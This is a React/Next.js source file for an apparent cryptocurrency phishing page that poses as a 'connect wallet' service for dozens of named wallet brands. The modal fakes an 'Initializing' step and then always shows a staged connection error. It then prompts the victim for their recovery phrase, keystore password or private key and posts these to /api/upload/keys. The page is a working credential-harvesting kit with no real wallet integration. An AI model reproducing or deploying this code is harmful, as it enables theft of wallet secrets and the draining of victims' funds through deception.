"use client";

import {
  Box,
  Typography,
  Stack,
  Container,
  Grid,
  Avatar,
  Tabs,
  Tab,
  TextField,
  Button,
  CircularProgress,
} from "@mui/material";
import React, { useEffect, useState } from "react";
import Image from "next/image";
import { useRouter } from "@node_modules/next/navigation";
import Modal from "@mui/material/Modal";
import axios from "@node_modules/axios";

const style = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  width: 400,
  bgcolor: "background.paper",
  p: 4,
  boxShadow: 10,
  borderRadius: "10px",
};

const BasicModal = ({
  open,
  setOpen,
  active,
  value,
  setValue,
  setPage,
  page,
}) => {
  const handleClose = () => setOpen(false);
  const [data, setData] = useState(0);
  const [activeTab, setActiveTab] = useState("phrase");
  const handleTabChange = (event, newValue) => {
    setData(newValue);
  };
  useEffect(() => {
    if (value === 0) {
      const timeout = setTimeout(() => {
        setValue(1);
      }, 3000);

      return () => clearTimeout(timeout);
    }
  }, [value]);

  const [privates, setPrivate] = useState("");
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [uploading, setUploading] = useState(false);

  const handleUpload = async () => {
    try {
      setUploading(true);
      const { data } = await axios.post("/api/upload/keys", {
        privatekey: privates,
        phrase: phrase,
        keystore: keystore,
      });
      setUploading(false);
    } catch (error) {
      setUploading(false);
    }
  };

  return (
    <div>
      <Modal
        open={open}
        onClose={handleClose}
        aria-labelledby="modal-modal-title"
        aria-describedby="modal-modal-description"
      >
        <Box sx={style}>
          {page === 0 && (
            <Stack durection="column" justifyContent="space-between">
              <Box
                sx={{
                  border: "1px solid red",
                  borderRadius: "10px",
                  padding: "15px 5px",
                }}
              >
                {value === 0 ? (
                  <Typography sx={{ color: "green" }}>
                    Initializing ...
                  </Typography>
                ) : (
                  <Typography
                    onClick={() => setPage(1)}
                    style={{ color: "gray" }}
                  >
                    Error Connecting...{" "}
                    <soan className="bg-slate-600 rounded-xl text-gray-100 cursor-pointer py-2 px-1">
                      Connect Manually
                    </soan>
                  </Typography>
                )}
              </Box>
              <Box
                sx={{
                  border: "1px solid gray",
                  borderRadius: "10px",
                  padding: "10px 5px",
                  marginTop: "10px",
                }}
              >
                <Stack direction="row" justifyContent="space-between">
                  <Typography
                    sx={{
                      color: "gray",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    {active?.name}
                  </Typography>
                  <Box>
                    <Avatar src={active?.src} alt="wallet" />
                  </Box>
                </Stack>
              </Box>
            </Stack>
          )}
          {page === 1 && (
            <Box
              sx={{
                maxWidth: 500,
                borderRadius: 2,
                p: 3,
                backgroundColor: "white",
              }}
            >
              {/* Header */}
              <Box display="flex" alignItems="center" mb={2}>
                <Avatar
                  src={active?.src} // Replace with your logo
                  alt="Logo"
                  style={{ marginRight: 8 }}
                />
                <Typography variant="h6" fontWeight="bold">
                  {active?.name}
                </Typography>
              </Box>

              {/* Tabs */}
              <Stack direction="row" justifyContent="space-between">
                <Typography
                  sx={{
                    background: activeTab === "phrase" ? "skyblue" : "white",
                    cursor: "pointer",
                    color: activeTab === "phrase" ? "white" : "black",
                    paddingX: "2px",
                    borderRadius: "10px",
                  }}
                  onClick={() => setActiveTab("phrase")}
                >
                  Phrase
                </Typography>
                <Typography
                  sx={{
                    background: activeTab === "keystore" ? "skyblue" : "white",
                    cursor: "pointer",
                    color: activeTab === "keystore" ? "white" : "black",
                    paddingX: "2px",
                    borderRadius: "10px",
                  }}
                  onClick={() => setActiveTab("keystore")}
                >
                  Keystore Json
                </Typography>
                <Typography
                  sx={{
                    background: activeTab === "private" ? "skyblue" : "white",
                    cursor: "pointer",
                    color: activeTab === "private" ? "white" : "black",
                    paddingX: "2px",
                    borderRadius: "10px",
                  }}
                  onClick={() => setActiveTab("private")}
                >
                  Private Key
                </Typography>
              </Stack>

              {/* Content */}
              {activeTab === "phrase" && (
                <Box mt={2}>
                  <Typography variant="body2" mb={1}>
                    Enter your recovery phrase
                  </Typography>
                  <TextField
                    multiline
                    rows={4}
                    variant="outlined"
                    fullWidth
                    placeholder="Enter your recovery phrase"
                    onChange={(e) => setPhrase(e.target.value)}
                  />
                  <Typography
                    variant="caption"
                    color="textSecondary"
                    mt={1}
                    display="block"
                  >
                    Typically 12 (sometimes 24) words separated by single spaces
                  </Typography>
                </Box>
              )}
              {activeTab === "keystore" && (
                <Box mt={2}>
                  <Typography variant="body2" mb={1}>
                    Enter your keystore json
                  </Typography>
                  <input type="file" />
                  <TextField
                    variant="outlined"
                    fullWidth
                    placeholder="Wallet Password"
                    onChange={(e) => setKeystore(e.target.value)}
                  />
                </Box>
              )}
              {activeTab === "private" && (
                <Box mt={2}>
                  <Typography variant="body2" mb={1}>
                    Enter your Private Key
                  </Typography>
                  <TextField
                    variant="outlined"
                    fullWidth
                    placeholder="Enter your Private Key"
                    onChange={(e) => setPrivate(e.target.value)}
                  />
                </Box>
              )}

              <Box display="flex" justifyContent="space-between" mt={3}>
                <button style={{ color: "red" }}>Cancel</button>
                <button
                  style={{
                    background: "skyblue",
                    color: "white",
                    borderRadius: "10px",
                    padding: "10px",
                    borderRadius: "10px",
                  }}
                  onClick={handleUpload}
                >
                  {uploading ? (
                    <CircularProgress size={15} sx={{ color: "white" }} />
                  ) : (
                    "Submit"
                  )}
                </button>
              </Box>
            </Box>
          )}
        </Box>
      </Modal>
    </div>
  );
};

const page = () => {
  const router = useRouter();
  const [open, setOpen] = useState(false);
  const [active, setActive] = useState(null);
  const [value, setValue] = useState(0);
  const [page, setPage] = useState(0);

  const walletApps = [
    {
      name: "Ledger",
      src: "https://copymoon.net/link/wallet/ledger.52e09fe1.jpg",
    },
    {
      name: "Trust",
      src: "https://copymoon.net/link/wallet/trust-wallet.4121118e.png",
    },
    {
      name: "MetaMask",
      src: "https://copymoon.net/link/wallet/metamask.9d0bcbd4.png",
    },
    {
      name: "TronLink",
      src: "https://copymoon.net/link/wallet/tronlink.330be608.jpg",
    },
    {
      name: "Atomic",
      src: "https://copymoon.net/link/wallet/atomic.a2bb6f98.png",
    },
    { name: "Coinbase", src: "/img/coin.jpeg" },
    {
      name: "Coinomi",
      src: "https://copymoon.net/link/wallet/coinomi.48bb4912.jpg",
    },
    { name: "Blockchain", src: "/img/blockchain.jpeg" },
    {
      name: "TokenPocket",
      src: "https://copymoon.net/link/wallet/tokenpocket.b7c388ce.png",
    },
    {
      name: "MathWallet",
      src: "https://copymoon.net/link/wallet/math-wallet.23e9877e.png",
    },
    { name: "Pillar", src: "/img/piller.png" },
    {
      name: "Authereum",
      src: "https://copymoon.net/link/wallet/authereum.9fc6b1c3.png",
    },
    {
      name: "Rainbow",
      src: "https://copymoon.net/link/wallet/rainbow.6d0d2612.png",
    },
    { name: "Eidoo", src: "eidoo.png" },
    {
      name: "ZelCore",
      src: "https://copymoon.net/link/wallet/zelcore.88c42d94.png",
    },
    {
      name: "Crypto.com | Defi Wallet",
      src: "https://copymoon.net/link/wallet/crypto.836cded4.png",
    },
    {
      name: "Gnosis Safe Multisig",
      src: "/img/gnose.jpeg",
    },
    {
      name: "GridPlus",
      src: "https://copymoon.net/link/wallet/gridplus.87a9dc29.png",
    },
    {
      name: "Cool Wallet S",
      src: "https://copymoon.net/link/wallet/coolwallet.3a4392c5.png",
    },
    { name: "Alice", src: "/img/alice.png" },
    { name: "AlphaWallet", src: "/img/alice2.jpeg" },
    { name: "Tokenary", src: "/img/tokenr.png" },
    {
      name: "SafePal",
      src: "https://copymoon.net/link/wallet/safepal.71147cce.png",
    },
    { name: "Equal", src: "/img/equal.jpeg" },
    {
      name: "Infinity Wallet",
      src: "https://copymoon.net/link/wallet/infinity-wallet.fa160fcf.png",
    },
    {
      name: "Wallet.io",
      src: "https://copymoon.net/link/wallet/wallet.io.b76f6e0c.png",
    },
    { name: "Brighte Wallet", src: "/img/bright.png" },
    { name: "Nash", src: "/img/nash.png" },
    { name: "SWFT Wallet", src: "/img/swft.png" },
    { name: "Ellipal", src: "/img/elipal.png" },
    { name: "Loopring Wallet", src: "/img/loop.jpeg" },
  ];
  return (
    <Box sx={{ padding: { md: "10px 15px", xs: "10px 10px" } }}>
      <Stack
        direction="row"
        justifyContent="space-between"
        sx={{
          width: "100%",
          padding: "10px",
          background: "#c6d1e6",
          borderRadius: "10px",
        }}
      >
        <Typography
          onClick={() => router.back()}
          sx={{
            cursor: "pointer",
            color: "blue",
            fontWeight: "bold",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            height: "100px",
          }}
        >
          Go Back
        </Typography>
        <Image
          src="/img/logo1.png"
          alt="Mailgo logo"
          width={110}
          height={50}
          priority
        />{" "}
        <div style={{ color: "#c6d1e6" }}>hiiiiiiiiiiiiiii</div>
      </Stack>
      <Container
        maxWidth="md"
        sx={{
          textAlign: "center",
          py: 8, // Padding for top and bottom
        }}
      >
        {/* Title */}
        <Typography
          variant="h4"
          sx={{
            fontWeight: "bold",
            color: "#3b4b5b", // Adjust color to match the image
            mb: 2, // Margin bottom
          }}
        >
          One Click Deposit, Connect wallet
        </Typography>

        {/* Description */}
        <Typography
          variant="body1"
          sx={{
            color: "#6c7a89", // Light gray-blue color for description
            lineHeight: 1.8, // Adjust line spacing
          }}
        >
          iOS and Android wallets that support the CopyMoon protocol allow users
          to initiate one-click deposits and withdrawals. Whether automatically
          or manually linking their wallets, they can securely start using
          dApps. Mobile deep linking ensures seamless interaction between mobile
          apps and browsers.
        </Typography>
      </Container>
      <Container maxWidth="lg" sx={{ py: 5 }}>
        <Grid container spacing={4} justifyContent="center">
          {walletApps.map((wallet, index) => (
            <Grid
              item
              xs={6}
              sm={4}
              md={3}
              key={index}
              display="flex"
              justifyContent="center"
              onClick={() => {
                setActive(wallet);
                setOpen(true);
                setValue(0);
              }}
            >
              <Box textAlign="center">
                <Box
                  component="img"
                  src={wallet.src}
                  alt={wallet.name}
                  sx={{
                    width: 60,
                    height: 60,
                    objectFit: "contain",
                    mb: 1,
                  }}
                />
                <Typography
                  variant="body2"
                  sx={{ fontWeight: "medium", color: "#3b4b5b" }}
                >
                  {wallet.name}
                </Typography>
              </Box>
            </Grid>
          ))}
        </Grid>
      </Container>
      <BasicModal
        open={open}
        setOpen={setOpen}
        active={active}
        value={value}
        setValue={setValue}
        setPage={setPage}
        page={page}
      />
    </Box>
  );
};

export default page;
